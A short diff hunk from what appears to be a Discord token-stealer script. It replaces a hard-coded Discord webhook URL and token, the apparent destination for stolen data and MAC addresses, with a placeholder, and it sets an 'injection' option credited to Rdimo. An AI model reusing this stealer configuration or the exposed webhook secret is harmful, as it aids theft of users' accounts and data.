@@ -28,7 +28,7 @@ from urllib.request import urlopen
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from getmac import get_mac_address as gma
 
-weblink = "https://discord.com/api/webhooks/974451244024340510/v2pxnX-iPbvSwEidW_yqZ2pHtW8qR053svmjkfFO2DWDdG6wXmCwz042QFJrGEyPG2UO"
+weblink = "YOUR_WEBHOOK"
 #The injection Was Mad By Rdimo#6969
 injection = "YES_NO"
 
